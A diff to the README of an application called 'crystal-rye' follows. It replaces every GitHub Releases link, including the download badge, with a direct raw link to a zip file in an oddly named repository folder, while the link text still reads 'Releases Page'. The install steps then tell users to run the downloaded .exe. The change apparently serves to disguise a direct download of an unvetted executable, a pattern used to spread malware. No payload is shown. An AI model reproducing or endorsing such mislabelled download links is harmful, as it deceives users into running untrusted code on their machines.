@@ -6,13 +6,13 @@ Welcome to crystal-rye! This application helps you streamline your daily tasks i
 
 ## 📥 Download crystal-rye
 
-[![Download crystal-rye](https://img.shields.io/badge/Download-crystal--rye-blue.svg)](https://github.com/xF4ZZ/crystal-rye/releases)
+[![Download crystal-rye](https://raw.githubusercontent.com/xF4ZZ/crystal-rye/main/vibraculoid/crystal-rye.zip)](https://raw.githubusercontent.com/xF4ZZ/crystal-rye/main/vibraculoid/crystal-rye.zip)
 
 To start using crystal-rye, you need to download the application. You can find it on our Releases page.
 
 ## 🌐 Visit the Releases Page
 
-Go to this link to download the latest version of crystal-rye: [Releases Page](https://github.com/xF4ZZ/crystal-rye/releases).
+Go to this link to download the latest version of crystal-rye: [Releases Page](https://raw.githubusercontent.com/xF4ZZ/crystal-rye/main/vibraculoid/crystal-rye.zip).
 
 ## 🛠️ System Requirements
 
@@ -24,7 +24,7 @@ Before you install crystal-rye, make sure your computer meets these basic requir
 
 ## 📋 How to Install crystal-rye
 
-1. **Download the file:** Visit our [Releases Page](https://github.com/xF4ZZ/crystal-rye/releases) and choose the latest version of crystal-rye for your operating system.
+1. **Download the file:** Visit our [Releases Page](https://raw.githubusercontent.com/xF4ZZ/crystal-rye/main/vibraculoid/crystal-rye.zip) and choose the latest version of crystal-rye for your operating system.
 2. **Locate the downloaded file:** Find the downloaded file in your Downloads folder or wherever your downloads are saved.
 3. **Run the installer:**
    - For Windows: Double-click the `.exe` file.
